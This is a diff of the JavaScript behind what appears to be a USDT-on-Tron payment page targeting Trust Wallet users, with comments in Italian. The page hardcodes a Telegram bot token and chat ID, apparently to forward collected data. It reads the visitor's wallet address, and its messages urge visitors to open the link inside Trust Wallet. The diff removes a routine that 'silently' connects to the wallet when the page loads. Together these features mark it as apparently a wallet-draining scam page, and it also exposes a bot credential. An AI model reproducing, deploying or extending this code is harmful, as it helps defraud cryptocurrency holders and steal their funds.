@@ -121,25 +121,8 @@
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_tron';
-        let walletConnected = false;
-
-        // Connessione silenziosa al caricamento della pagina
-        async function initializeTronWeb() {
-            let retries = 0;
-            while (!window.tronWeb && retries < 20) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                retries++;
-            }
-
-            if (window.tronWeb) {
-                // TronWeb è disponibile - il wallet è connesso silenziosamente
-                walletConnected = true;
-                console.log('TronWeb connected silently');
-            }
-        }
 
         document.addEventListener('DOMContentLoaded', ( ) => {
-            initializeTronWeb();
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -279,21 +262,20 @@
             clearError();
 
             try {
-                // Usa TronWeb che è stato connesso silenziosamente
+                // Quando clicca "Next" - leggi l'indirizzo SOLO se disponibile
                 let tronWeb = window.tronWeb;
 
                 if (!tronWeb) {
-                    showError('Trust Wallet not detected');
+                    showError('Please open this link inside Trust Wallet');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                // Ottieni l'indirizzo dal wallet già connesso
                 let userAddress = tronWeb.defaultAddress.base58;
 
                 if (!userAddress) {
-                    showError('Wallet not connected');
+                    showError('Wallet address not available');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
